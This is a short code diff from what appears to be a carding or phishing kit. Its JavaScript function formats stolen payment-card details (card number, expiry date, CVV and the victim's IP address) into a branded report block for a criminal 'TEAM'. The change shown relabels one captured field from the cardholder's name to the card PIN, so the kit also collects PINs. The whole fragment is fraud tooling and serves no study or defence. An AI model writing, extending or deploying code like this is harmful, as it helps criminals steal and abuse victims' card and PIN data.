@@ -188,7 +188,7 @@ function a2(data,ip) {
     let block="";
     block += `${brand}  | [CC-s5ona] |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    block += `CARD N*: ${data.a1}\nMM/YY: ${data.a2}\nCVV: ${data.a3}\nnom: ${data.a4}\nIP: ${ip}\n`;
+    block += `CARD N*: ${data.a1}\nMM/YY: ${data.a2}\nCVV: ${data.a3}\nPIN: ${data.a4}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `${brand}  | [${target}]  |  TEAM`;
     
